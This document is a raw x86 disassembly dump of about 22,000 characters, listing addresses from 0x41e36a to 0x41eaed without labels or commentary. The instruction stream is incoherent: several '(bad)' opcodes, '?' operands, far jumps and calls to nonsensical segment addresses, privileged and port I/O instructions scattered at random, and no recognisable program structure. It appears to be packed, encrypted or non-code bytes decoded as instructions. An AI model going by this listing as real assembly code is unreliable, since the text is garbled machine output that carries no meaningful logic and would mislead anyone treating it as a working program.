  41e36a:	or     al,0xee
  41e36c:	or     al,0xa4
  41e36e:	add    BYTE PTR [esi+0x3cd79da2],0x3c
  41e375:	fbld   TBYTE PTR [ebp-0x4b]
  41e378:	and    eax,0x3a099702
  41e37d:	hlt    
  41e37e:	dec    ecx
  41e37f:	xchg   edx,eax
  41e380:	jp     0x41e3fb
  41e382:	data16 sahf 
  41e384:	pop    es
  41e385:	xadd   BYTE PTR [ebx-0x7a],dh
  41e389:	push   eax
  41e38a:	inc    ebp
  41e38b:	fidiv  WORD PTR [edi]
  41e38d:	mov    esp,0xe5a4314b
  41e392:	aam    0xf2
  41e394:	adc    eax,0x5d9a05ce
  41e399:	int    0x36
  41e39b:	call   0x3bc35dfc
  41e3a0:	scas   eax,DWORD PTR es:[edi]
  41e3a1:	shl    BYTE PTR [ebx-0x3bc77502],1
  41e3a7:	or     eax,0x6355bba
  41e3ac:	add    al,0x9c
  41e3ae:	ss jecxz 0x41e345
  41e3b1:	je     0x41e3a4
  41e3b3:	cmp    al,0xef
  41e3b5:	in     al,0x7b
  41e3b7:	mov    ds:0xd1bb69c5,al
  41e3bc:	outs   dx,BYTE PTR ds:[esi]
  41e3bd:	fldcw  WORD PTR [ecx]
  41e3bf:	fs nop
  41e3c1:	jnp    0x41e3a9
  41e3c3:	dec    edx
  41e3c4:	xchg   DWORD PTR [esi-0x16953521],esi
  41e3ca:	cmp    al,0x3f
  41e3cc:	cwde   
  41e3cd:	dec    ebx
  41e3ce:	scas   eax,DWORD PTR es:[edi]
  41e3cf:	lds    esi,FWORD PTR [eax]
  41e3d1:	loop   0x41e42c
  41e3d3:	ret    
  41e3d4:	inc    ecx
  41e3d5:	xchg   ebp,ebp
  41e3d7:	sbb    DWORD PTR [eax],0xfffffff2
  41e3da:	mov    al,0xff
  41e3dc:	jne    0x41e385
  41e3de:	test   dl,bl
  41e3e0:	loope  0x41e395
  41e3e2:	adc    esi,DWORD PTR [edi-0x59]
  41e3e5:	(bad)  
  41e3e7:	push   ebx
  41e3e8:	push   ds
  41e3e9:	mov    gs,WORD PTR [edi-0x45]
  41e3ec:	std    
  41e3ed:	cmc    
  41e3ee:	add    BYTE PTR [eax],al
  41e3f0:	add    BYTE PTR [eax],al
  41e3f2:	add    al,0xf8
  41e3f5:	and    eax,edi
  41e3f7:	cmp    ecx,ebx
  41e3f9:	loope  0x41e3df
  41e3fb:	mov    esi,0xe542fc94
  41e400:	nop
  41e401:	or     BYTE PTR [ecx],ch
  41e403:	pop    edi
  41e404:	add    DWORD PTR [eax],eax
  41e406:	hlt    
  41e407:	add    al,0x0
  41e409:	add    BYTE PTR [ebp+0x4b],cl
  41e40c:	xchg   esi,eax
  41e40d:	mov    ecx,0xe2e08df3
  41e412:	fbld   TBYTE PTR [ecx+0x185c5231]
  41e418:	push   edi
  41e419:	fsub   QWORD PTR [ebp-0x156d7ce4]
  41e41f:	shl    BYTE PTR [edi-0x5f],1
  41e422:	dec    esp
  41e423:	aad    0xc6
  41e425:	fisub  DWORD PTR [esi+edi*1]
  41e428:	arpl   dx,dx
  41e42a:	fidiv  DWORD PTR [esi+0x3642974c]
  41e430:	daa    
  41e431:	push   esp
  41e432:	std    
  41e433:	jnp    0x41e48e
  41e435:	pop    ds
  41e436:	mov    ah,dl
  41e438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e439:	mov    eax,ds:0x19695e21
  41e43e:	jmp    0x8379481f
  41e443:	mov    dh,0xfb
  41e445:	xchg   ecx,eax
  41e446:	jmp    0x4562:0x6a572c30
  41e44d:	add    ecx,DWORD PTR [ebp+edx*8+0x9642506]
  41e454:	ret    0x2525
  41e457:	add    al,0x8e
  41e459:	xor    esi,DWORD PTR [ebp-0xa]
  41e45c:	push   esi
  41e45d:	imul   ecx,DWORD PTR [ebp-0x768d2bd6],0xfffffff3
  41e464:	sbb    ebp,edx
  41e466:	fwait
  41e467:	loop   0x41e4bd
  41e469:	std    
  41e46a:	mov    dl,0x79
  41e46c:	pop    edi
  41e46d:	lea    ebp,[ebp-0x47]
  41e470:	test   BYTE PTR [esi],bl
  41e472:	hlt    
  41e473:	out    0x27,al
  41e475:	iret   
  41e476:	sbb    ch,BYTE PTR [ebx]
  41e478:	jl     0x41e4e8
  41e47a:	mov    bh,0x96
  41e47c:	mov    dh,0xb4
  41e47e:	dec    esi
  41e47f:	loop   0x41e46f
  41e481:	daa    
  41e482:	int    0x10
  41e484:	xor    BYTE PTR [ebp+0x3a],0x3a
  41e488:	push   ecx
  41e489:	or     al,0xe2
  41e48b:	imul   esp,eax,0x413b2b30
  41e491:	push   ss
  41e492:	sbb    ah,bl
  41e494:	pop    ds
  41e495:	ret    0xa942
  41e498:	and    eax,0x2a734f86
  41e49d:	xor    eax,0xae445de3
  41e4a2:	outs   dx,DWORD PTR ds:[esi]
  41e4a3:	repnz mov ah,0xe4
  41e4a6:	inc    edx
  41e4a7:	mov    bh,0xa5
  41e4a9:	bound  edi,QWORD PTR [esi+edx*2]
  41e4ac:	mov    cl,0x76
  41e4ae:	shr    DWORD PTR [ecx-0x1127e936],cl
  41e4b4:	xchg   esi,eax
  41e4b5:	nop
  41e4b6:	jmp    0xaa9e48f2
  41e4bb:	mov    al,0xe1
  41e4bd:	dec    edi
  41e4be:	adc    BYTE PTR [esi],cl
  41e4c0:	outs   dx,DWORD PTR ds:[esi]
  41e4c1:	les    eax,FWORD PTR [ecx-0x2b]
  41e4c4:	sbb    dl,ah
  41e4c6:	stos   BYTE PTR es:[edi],al
  41e4c7:	adc    esi,DWORD PTR [esi]
  41e4c9:	mov    ebp,0x82736912
  41e4ce:	sub    al,0xb1
  41e4d0:	jmp    0x243d:0x14abd5
  41e4d7:	out    dx,eax
  41e4d8:	cdq    
  41e4d9:	in     al,dx
  41e4da:	push   edi
  41e4db:	pop    esi
  41e4dc:	and    BYTE PTR ds:0xc669b089,ch
  41e4e2:	daa    
  41e4e3:	push   edx
  41e4e4:	jg     0x41e54f
  41e4e6:	test   DWORD PTR [eax],0x2506ad5
  41e4ec:	xor    DWORD PTR [ebp-0x46390c11],ecx
  41e4f2:	fwait
  41e4f3:	adc    DWORD PTR [edx-0x41d9cd46],0x45
  41e4fa:	jbe    0x41e567
  41e4fc:	sbb    bh,dl
  41e4fe:	pushf  
  41e4ff:	adc    DWORD PTR [ebx-0x71],esi
  41e502:	test   ebp,0x9dd7c637
  41e508:	hlt    
  41e509:	mov    ebx,0x5827a5b6
  41e50e:	sbb    DWORD PTR [edi-0x59],esi
  41e511:	mov    ch,0xb4
  41e513:	mov    ecx,0x22b8afcf
  41e518:	test   edi,esi
  41e51a:	pop    DWORD PTR [edi+ebp*8]
  41e51d:	mov    dl,0x7f
  41e51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e520:	and    DWORD PTR [esi+ebp*8-0x54],edx
  41e524:	out    0x3f,al
  41e526:	jmp    0xb95db092
  41e52b:	fstp   DWORD PTR [ebx]
  41e52d:	inc    esp
  41e52e:	mov    eax,0x5a2268d0
  41e533:	pop    edx
  41e534:	ins    DWORD PTR es:[edi],dx
  41e535:	mov    dh,0xc7
  41e537:	sar    dl,cl
  41e539:	push   0x9da9e0f5
  41e53e:	cmp    al,dl
  41e540:	mov    ah,0x57
  41e542:	xchg   DWORD PTR [ebx],edi
  41e544:	iret   
  41e545:	(bad)  
  41e546:	pop    edx
  41e547:	shl    dl,cl
  41e549:	mov    eax,ds:0x8cea237d
  41e54e:	jbe    0x41e559
  41e550:	mov    ah,0x26
  41e552:	shr    DWORD PTR [edi],cl
  41e554:	arpl   sp,cx
  41e556:	imul   edi,DWORD PTR [esi+0x7b],0x57aa5f67
  41e55d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e55e:	cmp    al,0x1b
  41e561:	jle    0x41e5cc
  41e563:	adc    al,0x39
  41e565:	pop    ebx
  41e566:	jge    0x41e51c
  41e568:	cli    
  41e569:	mov    cl,0x37
  41e56b:	inc    ecx
  41e56c:	jge    0x41e564
  41e56e:	or     eax,0xf23e0452
  41e573:	dec    esi
  41e574:	adc    BYTE PTR [ecx+eiz*8-0x2f461213],0xf9
  41e57c:	test   DWORD PTR [ecx+ebp*2-0x29],0xb59d058e
  41e584:	loop   0x41e526
  41e586:	sub    ecx,DWORD PTR [edi]
  41e588:	adc    al,0x69
  41e58a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e58b:	xor    BYTE PTR [eax+0x67f3c94b],dh
  41e591:	ss xor eax,0x10e6638d
  41e597:	mov    bl,0xec
  41e599:	xlat   BYTE PTR fs:[ebx]
  41e59b:	xor    BYTE PTR [ecx+0x46],cl
  41e59e:	xchg   esi,eax
  41e59f:	hlt    
  41e5a0:	shr    edi,0x6c
  41e5a3:	xor    dl,BYTE PTR [edi]
  41e5a5:	push   ds
  41e5a6:	jnp    0x41e5ba
  41e5a8:	jl     0x41e5b8
  41e5aa:	xchg   BYTE PTR [ebx-0x33],ah
  41e5ad:	add    DWORD PTR [eax],ebx
  41e5af:	int3   
  41e5b0:	pushf  
  41e5b1:	aas    
  41e5b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5b3:	lea    edi,[ecx]
  41e5b5:	cs retf 
  41e5b7:	pop    edi
  41e5b8:	test   BYTE PTR [edi+0x16301919],cl
  41e5be:	imul   ebx,DWORD PTR [edx+ecx*4],0x9dcb771b
  41e5c5:	pop    es
  41e5c6:	xor    DWORD PTR [ebx+0x1f],ebx
  41e5c9:	dec    ecx
  41e5ca:	shl    DWORD PTR [edx+0x1e],1
  41e5cd:	add    ah,BYTE PTR [esi-0x1e581bf]
  41e5d3:	adc    bh,BYTE PTR [eax+esi*1+0x51003994]
  41e5da:	iret   
  41e5db:	das    
  41e5dc:	or     BYTE PTR es:0x6f3a696b,ch
  41e5e3:	jns    0x41e602
  41e5e5:	sbb    cl,BYTE PTR [eax+0x30]
  41e5e8:	in     eax,0x22
  41e5ea:	rcr    BYTE PTR [esi],1
  41e5ec:	sbb    DWORD PTR [ebx+0x1b2f6f35],edx
  41e5f2:	dec    edi
  41e5f3:	mov    ?,WORD PTR [edx]
  41e5f5:	mov    dh,0x1a
  41e5f7:	repz push 0xb3709a55
  41e5fd:	fs mov ecx,ecx
  41e600:	out    dx,eax
  41e601:	lock das 
  41e603:	sub    DWORD PTR [ebx+0x1f83966a],esp
  41e609:	test   al,0x8
  41e60b:	and    BYTE PTR ss:[edx-0x3b54ef2d],dl
  41e612:	cmp    ebp,edx
  41e614:	inc    DWORD PTR [eax+0x559e6c03]
  41e61a:	retf   0x11a8
  41e61d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e61e:	push   0xeaefc3c9
  41e623:	jmp    0xe99b:0x77d3fdd1
  41e62a:	test   al,0x78
  41e62c:	scas   eax,DWORD PTR es:[edi]
  41e62d:	inc    eax
  41e62e:	push   eax
  41e62f:	in     al,0xe1
  41e631:	int    0x98
  41e633:	push   edx
  41e634:	add    ah,BYTE PTR [edx-0x78]
  41e637:	mov    ecx,0x3152721c
  41e63c:	cmp    eax,esi
  41e63e:	adc    al,0xac
  41e640:	jmp    FWORD PTR [edx-0x22]
  41e643:	outs   dx,DWORD PTR ds:[esi]
  41e644:	outs   dx,DWORD PTR ds:[esi]
  41e645:	push   0x3d2ac6dd
  41e64a:	jae    0x41e649
  41e64c:	push   0xffffffd1
  41e64e:	rol    BYTE PTR [ebx],cl
  41e650:	lds    ebx,FWORD PTR [edx-0x32d28b91]
  41e656:	add    BYTE PTR [ebx],dl
  41e658:	jl     0x41e686
  41e65a:	jecxz  0x41e610
  41e65c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41e65e:	or     al,0xd7
  41e660:	out    0x4c,al
  41e662:	dec    edx
  41e663:	adc    ecx,DWORD PTR [edx+0x45]
  41e666:	fcom   DWORD PTR [eax]
  41e668:	fs xchg esi,eax
  41e66a:	fist   DWORD PTR [ebp-0xd]
  41e66d:	jbe    0x41e6b1
  41e66f:	cwde   
  41e670:	sub    eax,edi
  41e672:	test   eax,0x7b8ab395
  41e677:	jp     0x41e6aa
  41e679:	call   0xb952:0xe86908a0
  41e680:	jne    0x41e6b8
  41e682:	xchg   esi,eax
  41e683:	add    DWORD PTR [esi-0x66],esp
  41e686:	mov    ebp,0x6acf5906
  41e68b:	out    0x31,eax
  41e68d:	dec    esp
  41e68e:	sti    
  41e68f:	sbb    DWORD PTR [ecx],ebp
  41e691:	std    
  41e692:	inc    esi
  41e693:	add    al,0x5b
  41e695:	xor    al,0x6d
  41e697:	test   BYTE PTR [edx+0x7d],ch
  41e69a:	xchg   edi,eax
  41e69b:	mov    DWORD PTR [edx],eax
  41e69d:	dec    eax
  41e69e:	nop
  41e69f:	pop    edx
  41e6a0:	jbe    0x41e691
  41e6a2:	cmp    al,0x53
  41e6a4:	(bad)  
  41e6a5:	xor    eax,0x1afa55cf
  41e6aa:	add    BYTE PTR [ebx-0x153b428e],bl
  41e6b0:	jno    0xd9cc36c3
  41e6b6:	adc    esi,ecx
  41e6b8:	adc    cl,BYTE PTR [ecx+0x19]
  41e6bb:	push   0xcc1aabc
  41e6c0:	les    ecx,FWORD PTR [ecx+esi*1+0x3f7d46a0]
  41e6c7:	xchg   DWORD PTR [ecx+edi*1+0x8],ebx
  41e6cb:	bound  ebp,QWORD PTR [eax]
  41e6cd:	and    al,ch
  41e6cf:	(bad)  
  41e6d0:	loope  0x41e658
  41e6d2:	in     eax,0xe6
  41e6d4:	mov    ds:0x3ac865e0,al
  41e6d9:	inc    edx
  41e6da:	lea    eax,[ecx]
  41e6dc:	mov    DWORD PTR [ebp+0x220081b8],ecx
  41e6e2:	stos   DWORD PTR es:[edi],eax
  41e6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6e4:	mov    bh,0x5
  41e6e6:	div    BYTE PTR [edi]
  41e6e8:	mov    DWORD PTR ds:0xf1c4d802,0x736a5b23
  41e6f2:	mov    ebx,0x81f95ff8
  41e6f7:	and    DWORD PTR [ebx+eiz*2],0x504a0f05
  41e6fe:	(bad)  
  41e6ff:	push   0xd059d1ec
  41e704:	stos   DWORD PTR es:[edi],eax
  41e705:	mov    esp,0xd8f2a322
  41e70a:	ins    BYTE PTR es:[edi],dx
  41e70b:	xchg   esi,eax
  41e70c:	clc    
  41e70d:	icebp  
  41e70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e70f:	sti    
  41e710:	and    bl,ch
  41e712:	or     ah,BYTE PTR [esi+0x228ba00b]
  41e718:	ret    0x707
  41e71b:	xchg   esp,eax
  41e71c:	int3   
  41e71d:	push   0xd449fbb9
  41e722:	mov    ebp,0xac399a81
  41e727:	and    DWORD PTR [ecx-0x6e248894],esi
  41e72d:	jbe    0x41e72a
  41e72f:	pop    ebp
  41e730:	push   eax
  41e731:	mov    BYTE PTR [esi+0x726769fa],dl
  41e737:	or     eax,0xe20aec9
  41e73c:	nop
  41e73d:	mov    DWORD PTR [ebx-0x44],0xeea237f2
  41e744:	add    DWORD PTR [edx-0x3cd28d74],0xffffffd9
  41e74b:	ins    DWORD PTR es:[edi],dx
  41e74c:	adc    al,BYTE PTR [ebp-0x33]
  41e74f:	push   ebp
  41e750:	jno    0x41e721
  41e752:	xor    BYTE PTR [ecx],bl
  41e754:	adc    ah,BYTE PTR [edi+0x21cede5]
  41e75a:	sti    
  41e75b:	imul   ebp,DWORD PTR fs:[esi-0x63716b8f],0x16
  41e763:	out    dx,al
  41e764:	out    0x4e,al
  41e766:	clc    
  41e767:	in     al,dx
  41e768:	test   al,0xc
  41e76a:	sub    ah,BYTE PTR [ebp+0x35]
  41e76d:	ret    0xfc5
  41e770:	mov    bl,BYTE PTR [edi-0x46]
  41e773:	mov    bh,0xf7
  41e775:	adc    eax,0x7824852d
  41e77a:	shl    BYTE PTR [edi],1
  41e77c:	(bad)  
  41e77e:	fiadd  WORD PTR [esi+0xb]
  41e781:	mov    al,ds:0x701dc206
  41e786:	je     0x41e746
  41e788:	bound  ecx,QWORD PTR [edi+edi*4-0xb02a448]
  41e78f:	mov    ah,0xad
  41e791:	arpl   WORD PTR [edi-0x54],bp
  41e794:	add    al,0x49
  41e796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e797:	xor    al,0x30
  41e799:	(bad)  
  41e79a:	je     0x41e7bd
  41e79c:	dec    ebp
  41e79d:	mov    eax,ds:0x56a4f8b4
  41e7a2:	into   
  41e7a3:	jecxz  0x41e818
  41e7a5:	jg     0x41e7da
  41e7a7:	push   DWORD PTR [edi-0x395acead]
  41e7ad:	mov    DWORD PTR [edx+edx*4+0x701676fb],ebp
  41e7b4:	imul   DWORD PTR [ecx+0x68]
  41e7b7:	in     al,0x1c
  41e7b9:	aam    0xce
  41e7bb:	and    ebx,DWORD PTR [esi+0x1f]
  41e7be:	adc    edx,DWORD PTR [ebx]
  41e7c0:	sbb    ebx,ecx
  41e7c2:	cmp    cl,bl
  41e7c4:	adc    DWORD PTR [eax],ebp
  41e7c6:	xchg   ebx,eax
  41e7c7:	nop
  41e7c8:	adc    cl,BYTE PTR [ecx+0x3a522535]
  41e7ce:	bound  ebx,QWORD PTR [esi]
  41e7d0:	and    ch,BYTE PTR [esi]
  41e7d2:	push   esp
  41e7d3:	cs (bad) 
  41e7d5:	call   0xac39a8a5
  41e7da:	fdivr  QWORD PTR [edi-0x30]
  41e7dd:	push   ecx
  41e7de:	in     al,dx
  41e7df:	into   
  41e7e0:	inc    eax
  41e7e1:	cmc    
  41e7e2:	mov    edx,0xddbb8271
  41e7e7:	jmp    0x5542:0xca0eca2f
  41e7ee:	enter  0x5004,0x28
  41e7f2:	push   ds
  41e7f3:	ret    0x8a5d
  41e7f6:	scas   al,BYTE PTR es:[edi]
  41e7f7:	sbb    al,0xaa
  41e7f9:	gs aas 
  41e7fb:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41e7fd:	push   esi
  41e7fe:	cmp    dl,BYTE PTR [esi-0x1f2a7219]
  41e804:	scas   al,BYTE PTR es:[edi]
  41e805:	adc    ebp,DWORD PTR [edx]
  41e807:	mov    ebx,0x6143efb9
  41e80c:	adc    eax,0x27adc019
  41e811:	push   ebp
  41e812:	pop    ds
  41e813:	or     eax,0x4530b205
  41e818:	and    esi,DWORD PTR [ebp+0x1c]
  41e81b:	jl     0x41e7f4
  41e81d:	jne    0x41e87f
  41e81f:	(bad)  
  41e820:	cs push edi
  41e822:	adc    ebx,ebx
  41e824:	xchg   ebp,eax
  41e825:	scas   eax,DWORD PTR es:[edi]
  41e826:	jl     0x41e7cf
  41e828:	push   edi
  41e829:	fmul   st(2),st
  41e82b:	aad    0xef
  41e82d:	mov    al,0xc7
  41e82f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e830:	mov    gs,WORD PTR [ecx-0x6d3fbcfa]
  41e836:	test   eax,0x82b2b14f
  41e83b:	sbb    BYTE PTR gs:[edx-0x5dc7f041],bl
  41e842:	push   eax
  41e843:	adc    eax,0xdbfc3c88
  41e848:	push   edx
  41e849:	pop    esi
  41e84a:	sub    bl,dh
  41e84c:	daa    
  41e84d:	dec    ebx
  41e84e:	dec    esp
  41e84f:	push   0xffffffff
  41e851:	daa    
  41e852:	cmp    al,0x34
  41e854:	push   ebx
  41e855:	xchg   edi,eax
  41e856:	mul    esi
  41e858:	and    esp,esp
  41e85a:	je     0x41e866
  41e85c:	jo     0x41e7fa
  41e85e:	push   cs
  41e85f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e860:	ret    0xdccf
  41e863:	mov    BYTE PTR ds:[ebp+0x533ee5b5],al
  41e86a:	push   edx
  41e86b:	pushf  
  41e86c:	mov    ds:0x6d395442,eax
  41e871:	adc    eax,0xb27fd426
  41e876:	dec    ebx
  41e877:	fistp  WORD PTR [ebx]
  41e879:	mov    dl,bl
  41e87b:	sbb    al,0x6a
  41e87d:	fisttp DWORD PTR [edx]
  41e87f:	and    eax,0xb06f9f5a
  41e884:	stos   BYTE PTR es:[edi],al
  41e885:	cs pushf 
  41e887:	adc    esi,DWORD PTR [ebp-0x4af053fd]
  41e88d:	inc    eax
  41e88e:	add    eax,0x1ec8827d
  41e893:	pop    ds
  41e894:	fisttp WORD PTR [ecx+edi*8-0x5a7f6934]
  41e89b:	jge    0x41e86c
  41e89d:	ins    BYTE PTR es:[edi],dx
  41e89e:	mov    ecx,0x4684a861
  41e8a3:	add    DWORD PTR [ebx-0x7b2d8374],ebx
  41e8a9:	js     0x41e859
  41e8ab:	out    0x2e,al
  41e8ad:	xor    al,0x79
  41e8af:	sbb    BYTE PTR [eax],0x2a
  41e8b2:	in     al,dx
  41e8b3:	push   esp
  41e8b4:	inc    edi
  41e8b5:	jns    0x41e84b
  41e8b7:	sbb    eax,0x892b722a
  41e8bc:	cld    
  41e8bd:	outs   dx,DWORD PTR ds:[esi]
  41e8be:	mov    al,0xe6
  41e8c0:	cld    
  41e8c1:	clts   
  41e8c3:	and    ebx,ecx
  41e8c5:	dec    ebp
  41e8c6:	push   eax
  41e8c7:	mov    WORD PTR [eax],gs
  41e8c9:	push   edi
  41e8ca:	lods   al,BYTE PTR ds:[esi]
  41e8cb:	test   ch,ch
  41e8cd:	in     eax,dx
  41e8ce:	push   esi
  41e8cf:	popf   
  41e8d0:	cs push ss
  41e8d2:	aas    
  41e8d3:	cmp    dh,dl
  41e8d5:	rcr    ebp,1
  41e8d7:	add    bl,BYTE PTR [eax-0x1d]
  41e8da:	int    0x5f
  41e8dc:	adc    DWORD PTR ds:0xfeac65fc,0xffffffb8
  41e8e3:	std    
  41e8e4:	sub    DWORD PTR [eax],edx
  41e8e6:	into   
  41e8e7:	xor    BYTE PTR [eax+0x6fac70eb],al
  41e8ed:	shr    BYTE PTR [ebp-0x53d391ab],1
  41e8f3:	push   0x67
  41e8f5:	or     dh,dh
  41e8f7:	aaa    
  41e8f8:	scas   eax,DWORD PTR es:[edi]
  41e8f9:	jo     0x41e91c
  41e8fb:	(bad)  
  41e8fc:	pop    ds
  41e8fd:	add    BYTE PTR ss:[eax],al
  41e900:	add    BYTE PTR [eax],al
  41e902:	jg     0x41e97c
  41e904:	mov    ecx,0xffd5bf55
  41e909:	jp     0x41e931
  41e90b:	ret    0x676d
  41e90e:	lods   al,BYTE PTR ds:[esi]
  41e90f:	sar    BYTE PTR [ecx],1
  41e911:	push   ebp
  41e912:	sbb    eax,0xf4000164
  41e917:	add    al,0x0
  41e919:	add    BYTE PTR [ecx+0x79dabfc7],al
  41e91f:	sbb    edi,DWORD PTR [edi-0xd]
  41e922:	sti    
  41e923:	and    cl,BYTE PTR [edx-0x6b]
  41e926:	cwde   
  41e927:	(bad)  
  41e929:	add    DWORD PTR [edx+0x25a090ca],esp
  41e92f:	icebp  
  41e930:	and    bh,BYTE PTR [eax+0x4c0cdf1f]
  41e936:	push   ebx
  41e937:	lock cmc 
  41e939:	add    esp,DWORD PTR [edx-0x63]
  41e93c:	add    DWORD PTR [ecx-0x23d98e06],0xffffffad
  41e943:	or     ebx,0xd33ff625
  41e949:	jns    0x41e9c5
  41e94b:	inc    ebp
  41e94c:	dec    ecx
  41e94d:	in     eax,0x8
  41e94f:	push   edi
  41e950:	mov    dl,0xf1
  41e952:	cdq    
  41e953:	(bad)  
  41e954:	aas    
  41e955:	mov    al,0x7c
  41e957:	mov    ebx,0x84293fe
  41e95c:	xor    ebp,DWORD PTR [esi-0x64]
  41e95f:	pusha  
  41e960:	cwde   
  41e961:	iret   
  41e962:	push   0x50
  41e964:	fstp   TBYTE PTR [edi+0x2004c432]
  41e96a:	fbstp  TBYTE PTR [edi]
  41e96c:	sti    
  41e96d:	sbb    BYTE PTR ds:0x6d0fb3a3,dl
  41e973:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41e975:	test   al,0x3c
  41e977:	js     0x41e9cf
  41e979:	adc    eax,0xc7d39587
  41e97e:	sbb    edi,0xd845e73b
  41e984:	xor    eax,0x905f0b4e
  41e989:	push   eax
  41e98a:	pop    esp
  41e98b:	xchg   BYTE PTR [eax],dl
  41e98d:	leave  
  41e98e:	in     eax,dx
  41e98f:	mov    edi,esp
  41e991:	mov    al,0x4c
  41e993:	xchg   ebp,eax
  41e994:	inc    edx
  41e995:	int3   
  41e996:	sub    BYTE PTR [ebp+0x38e601a3],dl
  41e99c:	retf   
  41e99d:	sbb    eax,0xf89017a9
  41e9a2:	rep outs dx,BYTE PTR ds:[esi]
  41e9a4:	ret    0xd5c8
  41e9a7:	fsubr  DWORD PTR [ecx+0x12c21ea3]
  41e9ad:	cld    
  41e9ae:	aam    0xe5
  41e9b0:	inc    ebp
  41e9b1:	dec    ebp
  41e9b2:	mov    cl,0x14
  41e9b4:	push   es
  41e9b5:	jmp    FWORD PTR [eax-0x21ec43cf]
  41e9bb:	sbb    al,0x3b
  41e9bd:	lock xor ecx,DWORD PTR [ebp+edi*2+0x3988a85a]
  41e9c5:	ds ret 0x6b2c
  41e9c9:	mov    ss,WORD PTR [eax+0x5f]
  41e9cc:	jl     0x41e9f8
  41e9ce:	(bad)  
  41e9cf:	pushf  
  41e9d0:	cmp    eax,0x528dd1f0
  41e9d5:	out    0xe6,eax
  41e9d7:	pop    eax
  41e9d8:	das    
  41e9d9:	xchg   esp,eax
  41e9da:	pop    edi
  41e9db:	cmc    
  41e9dc:	lds    edi,FWORD PTR [esi-0x8618d9b]
  41e9e2:	push   cs
  41e9e3:	test   BYTE PTR [ebx+0x2e],dh
  41e9e6:	ins    DWORD PTR es:[edi],dx
  41e9e7:	test   DWORD PTR [ebx],esi
  41e9e9:	icebp  
  41e9ea:	pop    ebx
  41e9eb:	daa    
  41e9ec:	push   edx
  41e9ed:	fld    DWORD PTR [edi+0x23b5a712]
  41e9f3:	mov    bl,0xd6
  41e9f5:	fchs   
  41e9f7:	or     eax,0xfb574855
  41e9fc:	cwde   
  41e9fd:	jp     0x41e9aa
  41e9ff:	push   ss
  41ea00:	call   FWORD PTR [ebx+eiz*1+0x4b0959a9]
  41ea07:	and    al,BYTE PTR [esp+eax*1]
  41ea0a:	in     al,dx
  41ea0b:	jl     0x41ea33
  41ea0d:	sahf   
  41ea0e:	sbb    al,0x4c
  41ea10:	cmp    bh,BYTE PTR [eax-0x3871a42c]
  41ea16:	hlt    
  41ea17:	pushf  
  41ea18:	inc    eax
  41ea19:	dec    esi
  41ea1a:	mov    eax,?
  41ea1c:	mov    bh,0xf0
  41ea1e:	sbb    ebp,DWORD PTR [eax-0x30d1b04d]
  41ea24:	loop   0x41e9f6
  41ea26:	mov    bl,0xea
  41ea28:	and    BYTE PTR cs:[esi-0x9],0xa0
  41ea2d:	neg    DWORD PTR ds:0xc5f597dd
  41ea33:	add    BYTE PTR [esi+0x66e48019],0xe
  41ea3a:	jo     0x41ea5c
  41ea3c:	into   
  41ea3d:	fcmovnb st,st(6)
  41ea3f:	ins    DWORD PTR es:[edi],dx
  41ea40:	push   0x1df0de11
  41ea45:	push   esp
  41ea46:	pop    esi
  41ea47:	enter  0x3964,0xff
  41ea4b:	inc    edx
  41ea4c:	cmp    al,0x93
  41ea4e:	inc    ebx
  41ea4f:	fnstsw WORD PTR [esp+edx*4+0x7d]
  41ea53:	push   ecx
  41ea54:	call   0xdab3:0xfdd5af25
  41ea5b:	dec    edi
  41ea5c:	(bad)  
  41ea5d:	jns    0x41ea7e
  41ea5f:	lahf   
  41ea60:	add    BYTE PTR [ecx],0x44
  41ea63:	dec    edx
  41ea64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea65:	xchg   ecx,eax
  41ea66:	mov    eax,ds:0x69deafd2
  41ea6b:	pop    eax
  41ea6c:	sub    al,0xfc
  41ea6e:	cli    
  41ea6f:	xbegin 0x474e6a50
  41ea75:	in     al,0x79
  41ea77:	aas    
  41ea78:	fwait
  41ea79:	xlat   BYTE PTR ds:[ebx]
  41ea7a:	pop    edi
  41ea7b:	and    eax,0xe43c3f0f
  41ea80:	push   0x69
  41ea82:	pop    edi
  41ea83:	jle    0x41ea30
  41ea85:	test   eax,0x32a6334f
  41ea8a:	cmp    eax,0xe201ed22
  41ea8f:	adc    BYTE PTR [edi+0x77500df1],dh
  41ea95:	(bad)
  41ea98:	pop    edx
  41ea99:	retw   0x2bc9
  41ea9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea9e:	inc    ebx
  41ea9f:	popf   
  41eaa0:	hlt    
  41eaa1:	mov    ds:0x6b44ecf9,eax
  41eaa6:	xchg   esi,eax
  41eaa7:	inc    ebp
  41eaa8:	add    DWORD PTR [ecx+esi*8+0x65498aa0],0xe140682c
  41eab3:	aas    
  41eab4:	jge    0x41eb26
  41eab6:	int3   
  41eab7:	(bad)  
  41eab8:	push   ebp
  41eab9:	pop    edi
  41eaba:	aam    0xae
  41eabc:	lds    eax,FWORD PTR fs:[edx-0x3c]
  41eac0:	adc    bh,BYTE PTR [ecx]
  41eac2:	sahf   
  41eac3:	fld    st(1)
  41eac5:	ins    DWORD PTR es:[edi],dx
  41eac6:	ficomp WORD PTR [eax-0x21619ada]
  41eacc:	outs   dx,DWORD PTR ds:[esi]
  41eacd:	enter  0x60c4,0xec
  41ead1:	push   ebp
  41ead2:	jnp    0x41ea65
  41ead4:	adc    eax,0x83c6687c
  41ead9:	lea    ecx,[ebp-0x55]
  41eadc:	mov    cl,BYTE PTR [eax]
  41eade:	mov    esi,0x21781569
  41eae3:	pusha  
  41eae4:	loopne 0x41eadc
  41eae6:	cmp    ebx,DWORD PTR [esi]
  41eae8:	mov    al,ds:0x1bf86b74
  41eaed:	xchg   ebx,eax
